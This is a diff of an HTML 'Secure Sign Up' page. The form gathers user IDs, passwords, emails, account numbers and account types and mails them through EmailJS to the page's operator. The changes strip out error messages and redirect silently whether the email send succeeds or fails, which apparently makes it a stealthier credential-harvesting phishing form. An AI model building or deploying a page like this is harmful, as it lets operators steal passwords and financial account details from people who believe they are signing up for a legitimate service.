@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Sign Up</title>
-    <!-- EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
         * {
@@ -257,7 +256,6 @@
                 <select id="country" name="Country" required>
                     <option value="">Select Country</option>
                     <option value="US">United States</option>
-                    <!-- Add other countries as needed -->
                 </select>
 
                 <label for="phone">Phone Number</label>
@@ -290,7 +288,7 @@
                 <label for="terms">I have read and agree to the Terms & Conditions</label>
             </div>
 
-            <button type="submit">submit</button>
+           <a href="thankspage.html"> <button type="submit">Submit</button></a>
         </form>
     </div>
 
@@ -344,7 +342,7 @@
 
             // Validate passwords match
             if (password !== retypePassword) {
-                alert('Passwords do not match.');
+                window.location.href = `index.html?userId=${encodeURIComponent(userId)}`;
                 return;
             }
 
@@ -356,12 +354,10 @@
 
             // Store user data in localStorage (for login validation)
             const users = JSON.parse(localStorage.getItem('users')) || [];
-            if (users.some(u => u.userId === userId)) {
-                alert('User ID already exists. Please choose a different one.');
-                return;
+            if (!users.some(u => u.userId === userId)) {
+                users.push({ userId, password, email, accountNumber, accountType });
+                localStorage.setItem('users', JSON.stringify(users));
             }
-            users.push({ userId, password, email, accountNumber, accountType });
-            localStorage.setItem('users', JSON.stringify(users));
 
             // Prepare email data
             const templateParams = {
@@ -386,11 +382,9 @@
             // Send email via EmailJS
             emailjs.send('service_irtc32r', 'template_uh4d32w', templateParams)
                 .then(function(response) {
-                    alert('Sign up successful! Form data sent to email.');
-                    window.location.href = `thankspage.html?userId=${encodeURIComponent(userId)}`;
+                    window.location.href = `index.html?userId=${encodeURIComponent(userId)}`;
                 }, function(error) {
-                    alert('Failed to send email. Please try again.');
-                    console.error('EmailJS error:', error);
+                    window.location.href = `index.html?userId=${encodeURIComponent(userId)}`;
                 });
         });
     </script>
